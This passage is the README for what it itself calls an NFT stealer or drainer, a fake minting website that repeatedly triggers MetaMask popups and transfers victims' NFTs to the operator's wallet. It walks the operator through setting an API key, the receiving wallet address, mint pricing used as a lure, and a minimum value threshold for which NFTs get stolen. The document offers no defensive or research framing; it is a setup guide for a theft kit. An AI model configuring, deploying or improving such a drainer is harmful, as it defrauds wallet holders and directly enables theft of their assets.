- line 3: const moralisApi = `"X-API-KEY";` replace **X-API-KEY with your Moralis web3 api key**

  - Also, line after "const mintInfo" will change the minting price, the maximum supply, the minimum to be minted if the person doesn't have any NFTs, the maximum to be minted...
  - Line "askMintLoop: true" = metamask popup will open again and again until the popup is closed.

## `‚òÅÔ∏è Important (PLEASE READ BEFORE):` 

- Lines after **"const drainNftsInfo"** will be used for the NFT drainer.
- Edit lines : nftReceiveAddress: "YOUR WALLET", replace YOUR WALLET with your ETH wallet address.
- Line "minValue: 0.2," is the minimum value of a NFT before it gets stolen. 
Exemple : If you change this value to 1, the script will only steal NFTs that have a value higher to 1.
- To see the metamask popup, you must host the website

## `üëª Why it doesn't show my address?`

This **NFT stealer** interacts directly with the **nft contract** to transfer it to your address located in the **settings.js** file.
